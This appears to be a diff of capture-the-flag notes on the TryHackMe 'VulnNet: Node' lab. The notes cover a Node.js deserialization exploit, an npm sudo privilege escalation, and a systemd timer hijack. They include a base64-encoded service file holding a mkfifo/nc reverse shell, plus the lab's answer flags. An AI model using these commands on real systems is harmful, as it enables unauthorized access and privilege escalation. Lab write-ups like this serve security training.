@@ -114,7 +114,6 @@ so let's encode
 
 {"username":"Admin","isGuest":false,"encoding": "utf-8"}
 
-
 ┌──(kali㉿kali)-[~]
 └─$ echo -n "{"username":"Admin","isGuest":false,"encoding": "utf-8"}" | base64 
 e3VzZXJuYW1lOkFkbWluLGlzR3Vlc3Q6ZmFsc2UsZW5jb2Rpbmc6IHV0Zi04fQ==
@@ -135,12 +134,9 @@ SyntaxError: Unexpected token � in JSON at position 57
     at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
     at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
 
-
 let's see what happen
 
-
 https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
-
 
 https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
 
@@ -160,7 +156,6 @@ Resolving deltas: 100% (51/51), done.
 'command execution.js'   eval.js           hpp.js          nodejsshell.py   redos.js
  deserialization.js      fs.js             LICENSE         node-mongo.js    simple_server.js
  dir_traversal.js        global_scope.js   njsscan.sarif   README.md
-
 
 ┌──(kali㉿kali)-[~/Node.Js-Security-Course]
 └─$ python2 nodejsshell.py 10.8.19.103 4444                                 
@@ -228,9 +223,7 @@ Matching Defaults entries for www on vulnnet-node:
 User www may run the following commands on vulnnet-node:
     (serv-manage) NOPASSWD: /usr/bin/npm
 
-
 https://gtfobins.github.io/gtfobins/npm/
-
 
 TF=$(mktemp -d)
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
@@ -251,14 +244,12 @@ $ id
 id
 uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
 
-
 the command is like this:
 
 TF=$(mktemp -d) 
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json 
 chmod 777 $TF 
 sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
-
 
 > @ preinstall /tmp/tmp.jeRgicyAcT
 > /bin/sh
@@ -277,7 +268,6 @@ serv-manage@vulnnet-node:~$ cat user.txt                cat user.txt
 cat user.txt
 THM{064640a2f880ce9ed7a54886f1bde821}
 serv-manage@vulnnet-node:~$ 
-
 
 privesc
 
@@ -300,7 +290,6 @@ systemctl status vulnnet-auto.timer
    Loaded: loaded (/etc/systemd/system/vulnnet-auto.timer; disabled; vendor pres
    Active: inactive (dead)
   Trigger: n/a
-
 
 serv-manage@vulnnet-node:~$ ls -lh /etc/systemd/system/vulnnet-auto.timer
 ls -lh /etc/systemd/system/vulnnet-auto.timer
@@ -390,8 +379,6 @@ let's do the second method
 
 echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service
 
-
-
 serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$                                               echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service
 temd/system/vulnnet-job.service1bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/syst
 
@@ -441,7 +428,6 @@ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl stop vulnnet-a
 serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl daemon-reload
 serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl start vulnnet-auto.timer
 
-
 serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -l                                       sudo -l
 sudo -l
 User serv-manage may run the following commands on vulnnet-node:
@@ -468,10 +454,6 @@ eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9w
 
 ```
 
-![[Pasted image 20221228222341.png]]
-
-![[Pasted image 20221228225026.png]]
-
 What is the user flag? (user.txt)  
 
 *THM{064640a2f880ce9ed7a54886f1bde821}*
@@ -479,6 +461,5 @@ What is the user flag? (user.txt)
 What is the root flag? (root.txt)
 
 *THM{abea728f211b105a608a720a37adabf9}*
-
 
 [[Brooklyn Nine Nine]]
